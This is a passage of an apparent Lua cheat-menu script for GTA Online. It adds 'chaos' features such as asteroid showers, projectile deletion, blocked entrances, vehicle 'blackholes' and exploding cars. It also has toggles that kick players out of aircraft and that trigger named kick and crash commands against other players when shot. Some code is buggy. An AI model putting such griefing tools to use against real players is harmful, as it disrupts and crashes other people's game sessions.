            local asteroid = OBJECT.CREATE_OBJECT_NO_OFFSET(h, rand_1['x'], rand_1['y'], rand_1['z'], true, false, false)
            ENTITY.SET_ENTITY_HAS_GRAVITY(asteroid, true)
            --ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(asteroid, 4, diff.x, diff.y, diff.z, true, false, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(asteroid, 2, diff.x, diff.y, diff.z, 0, 0, 0, 0, true, false, true, false, true)
            OBJECT.SET_OBJECT_PHYSICS_PARAMS(asteroid, 100000, 5, 1, 0, 0, .5, 0, 0, 0, 0, 0)
            util.yield(1000)
        end
    end)
end

local function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield_once() end
end

local function toFloat(num)
    return (num / 10) * 10
end

local function is_entity_a_projectile(hash)
    local all_projectile_hashes = {
        util.joaat("w_ex_vehiclemissile_1"),
        util.joaat("w_ex_vehiclemissile_2"),
        util.joaat("w_ex_vehiclemissile_3"),
        util.joaat("w_ex_vehiclemissile_4"),
        util.joaat("w_ex_vehiclem,tar"),
        util.joaat("w_ex_apmine"),
        util.joaat("w_ex_arena_landmine_01b"),
        util.joaat("w_ex_birdshat"),
        util.joaat("w_ex_grenadefrag"),
        util.joaat("w_ex_grenadesmoke"),
        util.joaat("w_ex_molotov"),
        util.joaat("w_ex_pe"),
        util.joaat("w_ex_pipebomb"),
        util.joaat("w_ex_snowball"),
        util.joaat("w_lr_rpg_rocket"),
        util.joaat("w_lr_homing_rocket"),
        util.joaat("w_lr_firew,k_rocket"),
        util.joaat("xm_prop_x17_silo_rocket_01")
    }
    return table.contains(all_projectile_hashes, hash)
end

local function world_to_screen_coords(x, y, z)
    sc_x = memory.alloc(8)
    sc_y = memory.alloc(8)
    GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(x, y, z, sc_x, sc_y)
    local ret = {
        x = memory.read_float(sc_x),
        y = memory.read_float(sc_y)
    }
    return ret
end

-- texure loading
local function request_texture_dict_load(dict_name)
    request_time = os.time()
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict_name, true)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict_name) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end

-- OBJECTS

objects_thread = util.create_thread(function (thr)
    local projectile_blips = {}
    while true do
        for k,b in pairs(projectile_blips) do
            if HUD.GET_BLIP_INFO_ID_ENTITY_INDEX(b) == 0 then 
                util.remove_blip(b) 
                projectile_blips[k] = nil
            end
        end
        if object_uses > 0 then
            if show_updates then
                util.log("Object pool is being updated")
            end
            all_objects = entities.get_all_objects_as_pointers()
            for k, obj_ptr in pairs(all_objects) do
                --- PROJECTILE SHIT
                local obj_model = entities.get_model_hash(obj_ptr)
                if is_entity_a_projectile(obj_model) then
                    if projectile_warn then
                        local obj_hdl = entities.pointer_to_handle(obj_ptr)
                        local c = ENTITY.GET_ENTITY_COORDS(obj_hdl)
                        local screen_c = world_to_screen_coords(c.x, c.y, c.z)
                        local color = to_rgb(255, 0, 0, 255)
                        --directx.draw_text(screen_c.x, screen_c.y, "!", 5, 0.100, color, false)
                        request_texture_dict_load('visualflow')
                        GRAPHICS.DRAW_SPRITE('visualflow', 'crosshair', screen_c.x, screen_c.y, 0.02, 0.03, 0.0, 255, 0, 0, 255, true, 0)
                    end
                    if projectile_cleanse then 
                        entities.delete_by_pointer(obj_ptr)
                    end

                    if projectile_spaz then
                        local obj_hdl = entities.pointer_to_handle(obj_ptr)
                        --local target = entity.get_entity_owner(obj) 
                        local strength = 20
                        ENTITY.APPLY_FORCE_TO_ENTITY(obj_hdl, 1, math.random(-strength, strength), math.random(-strength, strength), math.random(-strength, strength), 0.0, 0.0, 0.0, 1, true, false, true, true, true)
                    end
                    if slow_projectiles then
                        local obj_hdl = entities.pointer_to_handle(obj_ptr)
                        --ENTITY.SET_ENTITY_VELOCITY(obj, 0.0, 0.0, 0.0)
                        ENTITY.SET_ENTITY_MAX_SPEED(obj_hdl, 0.5)
                    end
                    if blip_projectiles then
                        local obj_hdl = entities.pointer_to_handle(obj_ptr)
                        if HUD.GET_BLIP_FROM_ENTITY(obj_hdl) == 0 then
                            local proj_blip = HUD.ADD_BLIP_FOR_ENTITY(obj_hdl)
                            HUD.SET_BLIP_SPRITE(proj_blip, 443)
                            HUD.SET_BLIP_COLOUR(proj_blip, 75)
                            projectile_blips[#projectile_blips + 1] = proj_blip 
                        end
                    end
                end
                --------------
                if l_e_o_on then
                    local size = get_model_size(obj_model)
                    if size.x > l_e_max_x or size.y > l_e_max_y or size.z > l_e_max_y then
                        entities.delete_by_pointer(obj_ptr)
                    end
                end
            end    
        end
        util.yield()
    end
end)

local function mod_uses(type, incr)
    -- this func is a patch. every time the script loads, all the toggles load and set their state. in some cases this makes the _uses optimization negative and breaks things. this prevents that.
    if incr < 0 and is_loading then
        -- ignore if script is still loading
        util.log("Not incrementing use var of type " .. type .. " by " .. incr .. "- script is loading")
        return
    end
    util.log("Incrementing use var of type " .. type .. " by " .. incr)
    if type == "vehicle" then
        if vehicle_uses <= 0 and incr < 0 then
            return
        end
        vehicle_uses = vehicle_uses + incr
    elseif type == "pickup" then
        if pickup_uses <= 0 and incr < 0 then
            return
        end
        pickup_uses = pickup_uses + incr
    elseif type == "ped" then
        if ped_uses <= 0 and incr < 0 then
            return
        end
        ped_uses = ped_uses + incr
    elseif type == "player" then
        if player_uses <= 0 and incr < 0 then
            return
        end
        player_uses = player_uses + incr
    elseif type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

	worldchaos = menu.list(menu.my_root(), "Chaos Shit", {}, "", function(); end)

	menu.divider(worldchaos, "Chaos mode")

    projectiles = menu.list(worldchaos, "Edit Projectiles", {}, "", function(); end)

    projectile_cleanse = false
    menu.toggle(projectiles, "Delete Projectiles", {"deleteprojectiles"}, "This will piss people off.", function(on)
        projectile_cleanse = on
        mod_uses("object", if on then 1 else -1)
    end)

    projectile_warn = false
    menu.toggle(projectiles, "Draw Warning", {"drawwarning"}, "Draws a red box over projectiles to warn you of there existence.", function(on)
        projectile_warn = on
        mod_uses("object", if on then 1 else -1)
    end)

    projectile_spaz = false
    menu.toggle(projectiles, "Projectile Spaz", {"projectilespaz"}, "Makes projectiles follow a very unstable path.", function(on)
        projectile_spaz = on
        mod_uses("object", if on then 1 else -1)
    end)

    slow_projectiles = false
    menu.toggle(projectiles, "Extremely Slow Projectiles", {"extremelyslowprojectiles"}, "", function(on)
        slow_projectiles = on
        mod_uses("object", if on then 1 else -1)
    end)

    blip_projectiles = false
    menu.toggle(projectiles, "Blips For Projectiles", {"blipsforprojectiles"}, "", function(on)
        blip_projectiles = on
        mod_uses("object", if on then 1 else -1)
    end)


    areablocks = menu.list(worldchaos, "Block Entrances", {}, "", function(); end)

    menu.toggle(areablocks, "Casino", {"blockcasino"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 920.657, 48.360252, 44.913666, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash) 
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    area_lsc_blocks = menu.list(areablocks, "Block LSC Entrances", {}, "", function(); end)

    menu.toggle(area_lsc_blocks, "LSC Burton", {"blocklscb"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, -361.66696, -132.68272, 1.1650558, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash) 
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    menu.toggle(area_lsc_blocks, "LSC La Mesa", {"blocklm"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 719.7211, -1088.8136, -15.784607, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash) 
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    menu.toggle(area_lsc_blocks, "LSC International Airport", {"blockia"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, -1144.0221, -1989.1848, -21.592183, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash) 
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    menu.toggle(area_lsc_blocks, "LSC Grand Senora Desert", {"blockgsd"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 1174.6398, 2649.226, 1.21482217, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 1182.6398, 2649.226, 1.21482217, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    menu.toggle(area_lsc_blocks, "LSC Paleto Bay", {"blockpb"}, "", function(on_toggle)
        if on_toggle then
        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 116.85485, 6620.863, -5.287771, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)

        local hash = 1952396163
        loadModel(hash)
        for i = 0, 180, 8 do
            local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, 110.85485, 6614.863, -5.287771, true, true, true)
            ENTITY.SET_ENTITY_HEADING(wall, toFloat(i))
            util.yield(10)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
    else
        menu.trigger_commands("clearblocks")
        end
    end)

    menu.divider(areablocks, "__________________bruh__________________")


    menu.action(areablocks, "Clear All Blocks", {"clearblocks"}, "", function()
        local count = 0
        for k,ent in pairs(entities.get_all_objects_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            util.yield()
        end
    end)

    menu.action(areablocks, "Custom Bock", {"customblock"}, "Note: You can custom block entrances using a container object or something like it, Shotcut For Custom Model Gun.", function()
        menu.trigger_commands("custommodlegunloc")
        menu.trigger_commands("modgun")
    end)

    
    function get_entity_player_is_aiming_at(player)
        if not PLAYER.IS_PLAYER_FREE_AIMING(player) then
            return NULL
        end
        local entity, pEntity = NULL, memory.alloc_int()
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(player, pEntity) then
            entity = memory.read_int(pEntity)
        end
        if entity ~= NULL and ENTITY.IS_ENTITY_A_PED(entity) and PED.IS_PED_IN_ANY_VEHICLE(entity, false) then
            entity = PED.GET_VEHICLE_PED_IS_IN(entity, false)
        end
        return entity
    end

    function PlayerIsPointing()
        PlayerIsPointing = memory.read_int(memory.script_global(4521801 + 930)) == 3
    end

    chaosguns = menu.list(worldchaos, "Commanded Guns", {}, "", function(); end)
    
    local shotEntities = {}
    local counter = 0

    menu.toggle_loop(chaosguns, "Shoot and delete", {"shootdelete"}, "Deletes everything.", function()
        local entity = get_entity_player_is_aiming_at(players.user())
        if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
            if PED.IS_PED_SHOOTING(players.user_ped()) and
            not (shotEntities[1] and shotEntities[1] == entity) then
                counter = counter + 1
                shotEntities[counter] = entity
                menu.trigger_commands("noentities" ..PLAYER.GET_PLAYER_NAME(pid))
                util.yield(1000)
                menu.trigger_commands("noentities" ..PLAYER.GET_PLAYER_NAME(pid))
            end
        end
    end)
    
    menu.toggle_loop(chaosguns, "Kick at shoot", {"shootkick"}, "Uses breakup kick.", function()
        local entity = get_entity_player_is_aiming_at(players.user())
        if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
            if PED.IS_PED_SHOOTING(players.user_ped()) and
            not (shotEntities[1] and shotEntities[1] == entity) then
                counter = counter + 1
                shotEntities[counter] = entity
                menu.trigger_commands("breakup" ..PLAYER.GET_PLAYER_NAME(pid))
            end
        end
    end)

    menu.toggle_loop(chaosguns, "Crash at shoot", {"shootcrash"}, "Uses sex crash.", function()
        local entity = get_entity_player_is_aiming_at(players.user())
        if entity ~= 0 and ENTITY.DOES_ENTITY_EXIST(entity) then
            if PED.IS_PED_SHOOTING(players.user_ped()) and
            not (shotEntities[1] and shotEntities[1] == entity) then
                counter = counter + 1
                shotEntities[counter] = entity
                menu.trigger_commands("sexcrash" ..PLAYER.GET_PLAYER_NAME(pid))
            end
        end
    end)

	menu.toggle(worldchaos, "World Destruction", {"worlddestruction"}, "", function(on)
		if on then
			chaos = true
		else
			chaos = false
		end
	end, false)

    asteroids = false
menu.toggle(worldchaos, "Asteroid Shower", {"asteroids"}, "Spawns asteroids", function(on)
    if on then
        asteroids = true
        start_asteroid_shower()
    else
        asteroids = false
    end
end, false)

menu.toggle_loop(worldchaos, "Spinbot", {"spinbot"}, "", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    local velocity = ENTITY.GET_ENTITY_VELOCITY(vehicle)
    local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(vehicle)
    if height < 5.0 and height > 0.1 then
       --VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle)
    end
    if vehicle ~= 0 and not PED.IS_PED_DEAD_OR_DYING(players.user_ped()) and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
        ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 5, 0, 0, 150.0, 0, 0, 0, 0, true, false, true, false, true)
    end
end)

	drift = false
	menu.toggle(worldchaos, "Shift to Drift", {"driftmode"}, "", function(on_toggle)
		drift = on_toggle
	end)

	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Fly Nearby vehicles", {"vehflyall"}, "basically 'impulse like sport mode' but applied to every vehicle", function()
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
				cam_pos = CAM.GET_GAMEPLAY_CAM_ROT(0)
    			ENTITY.SET_ENTITY_ROTATION(veh, cam_pos.x, cam_pos.y, cam_pos.z, 1, true);
				local locspeed = speed*10
				local locspeed2 = speed
				if PAD.IS_CONTROL_PRESSED(0, 61) then
					locspeed = locspeed*2
					locspeed2 = locspeed2*2
				end
				if PAD.IS_CONTROL_PRESSED(2, 71) then
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 72) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed * 2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
					end
			   end
				if PAD.IS_CONTROL_PRESSED(2, 63) then
					local lsp = (0 - speed)*2
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = 0 - speed
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
					end
				end
				if PAD.IS_CONTROL_PRESSED(2, 64) then
					local lsp = speed
					if not PAD.IS_CONTROL_PRESSED(0, 61) then 
						lsp = speed*2
					end
					if dont_stop then
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					else 
						ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
					end
				end
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)


	local dont_stop = false
	menu.toggle_loop(worldchaos,"Vehicle Blackhole", {"vehicleblackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

    menu.toggle_loop(worldchaos,"Ped Blackhole", {"pedblackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_peds_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

    menu.toggle_loop(worldchaos,"Object Blackhole", {"objectblackhole"}, "Basically 'impulse like sport mode. but applied to every vehicle", function(on)
		for k, veh in pairs(entities.get_all_objects_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        speed = 100
                        local x_vec = (holecoords['x']-vcoords['x'])*speed
                        local y_vec = (holecoords['y']-vcoords['y'])*speed
                        local z_vec = ((holecoords['z']+hole_zoff)-vcoords['z'])*speed
                        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
                        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(veh, 1, x_vec, y_vec, z_vec, true, false, true, true)
				if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	hole_zoff = 50
    	menu.slider(worldchaos, "Blackhole Z-offset", {"blackholeoffset"}, "", 0, 100, 50, 10, function(s)
    	hole_zoff = s
	end)

	menu.toggle_loop(worldchaos,"Fuck up all cars", {"fuckupallcars"}, "Beats the SHIT out of all nearby cars. But this damage is only local.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_VEHICLE_DAMAGE(veh, math.random(-5.0, 5.0), math.random(-5.0, 5.0), math.random(-5.0,5.0), 200.0, 10000.0, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(worldchaos,"Honk all cars", {"honkallcars"}, "Honkss the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.START_VEHICLE_HORN(veh, 200, util.joaat("HELDDOWN"), true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.toggle_loop(worldchaos,"Blow up all cars", {"Blow up all cars"}, "Blows the SHIT out of all nearby cars.", function(on)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        FIRE.ADD_EXPLOSION(vcoords['x'], vcoords['y'], vcoords['z'], 7, 100.0, true, false, 1.0)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)

	menu.action(worldchaos, "Remove Wheels", {"removewheels"}, "removes your wheels and has various side effects depending on the vehicle", function()
		local veh = entities.get_user_vehicle_as_handle()
		if veh ~= 0 then
			native_invoker.begin_call()
			native_invoker.push_arg_int(veh)
			native_invoker.push_arg_float(3.402823466e+38)
			native_invoker.end_call("93A3996368C94158") -- VEHICLE.MODIFY_VEHICLE_TOP_SPEED
			--notification("Removed wheels", colors.red)
		end
	end)

	menu.action(worldchaos,"Kill all Engines", {"killall"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(entities.get_all_vehicles_as_handles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(ent, -4000)
		end)
	end)

	menu.toggle_loop(worldchaos, "All cars sink", {"sinkcars"}, "All cars sink.", function(on_toggle)
		for k, veh in pairs(entities.get_all_vehicles_as_handles()) do
			local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, -1, false)
			local locspeed2 = speed
        			local holecoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
			if not PED.IS_PED_A_PLAYER(PedInSeat) then
				NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
	      ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(bh_target), true)
                        vcoords = ENTITY.GET_ENTITY_COORDS(veh, true)
                        VEHICLE.SET_DISABLE_MAP_COLLISION(veh, vcoords, true)
	      if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
	      VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
				end
			end
		end
	end)


	menu.divider(worldchaos, "Anti-Try Hard Shit")

	oppressor_kick_players = false
	menu.toggle(worldchaos, "Anti-Oppressor", {"antioppressor"}, "Automatically kicks players off oppressor mkii's", function(on)
		oppressor_kick_players = on
	end, false)
    
	lazer_kick_players = false
	menu.toggle(worldchaos, "Anti-Lazer", {"antilazer"}, "Automatically kicks players out lazers", function(on)
		lazer_kick_players = on
	end, false)

    kosatka_kick_players = false
	menu.toggle(worldchaos, "Anti-Kosatka", {"antikosatka"}, "Automatically kicks players out kosatka", function(on)
		kosatka_kick_players = on
	end, false)

    hydra_kick_players = false
	menu.toggle(worldchaos, "Anti-Hydra", {"antihydra"}, "Automatically kicks players out hydra", function(on)
		hydra_kick_players = on
	end, false)

    khanjali_kick_players = false
	menu.toggle(worldchaos, "Anti-Khanjali", {"antikhanjali"}, "Automatically kicks players out khanjali", function(on)
		khanjali_kick_players = on
	end, false)

	lock_vehicle = false
	menu.toggle(worldchaos, "Lock vehicle", {"lockmk2"}, "Permanently locks the vehicle to prevent further use", function(on)
		lock_vehicle = on
	end, false)

	target_self = false
	menu.toggle(worldchaos, "Target self", {"targetselfmk2"}, "Targets your mk2's as well (this is stupid)", function(on)
		target_self = on
	end, false)

	target_friends = false
	menu.toggle(worldchaos, "Target friends", {"targetfriendsmk2"}, "Targets your friends' mk2's as well", function(on)
		target_friends = on
	end, false)


function update_join(pid)
	local name = players.get_name(pid)
	cmd_id[pid] = menu.toggle(custselc, name, {}, "PID - ".. pid, function(on_toggle)
		if on_toggle then
			selectedplayer[pid] = true
		else
			selectedplayer[pid] = false
		end
	end)
end

function update_leave(pid)
	menu.delete(cmd_id[pid])
end

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end

	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
